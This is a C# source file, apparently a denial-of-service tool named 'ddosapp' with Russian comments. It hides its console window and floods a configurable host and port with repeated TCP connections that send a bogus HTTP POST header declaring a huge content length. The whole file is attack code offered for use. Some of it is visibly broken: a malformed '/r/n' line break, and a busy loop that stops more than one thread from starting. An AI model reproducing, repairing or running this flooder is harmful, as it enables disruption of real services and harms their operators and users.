using System.Net.Sockets;
using System.Threading;
using System.IO;
using System;
using System.Runtime.InteropServices;

namespace ddosapp
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            ShowWindow(handle, SW_HIDE);
            string target = "127.0.0.1"; // хост цель
            int port = 10134; // цель порт
            long threads = 9000000000000000000; // число нитей

            for(int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    while (true)
                    {
                        try
                        {
                            TcpClient client = new TcpClient();
                            client.NoDelay = true;
                            client.Connect(target, port); // подключение
                            StreamWriter stream = new StreamWriter(client.GetStream());
                            stream.Write("POST / HTTP/1.1/r/nHost: " + target + "\r\nContent-length: 9000000000000000000\r\n\r\n"); // отправка пакетов
                            stream.Flush();
                            client.Close();
                        }
                        catch
                        {
                            // !!
                        }

                    }
                }).Start();
                while (true) ;
                // ожидание
            }
        }
    }
}
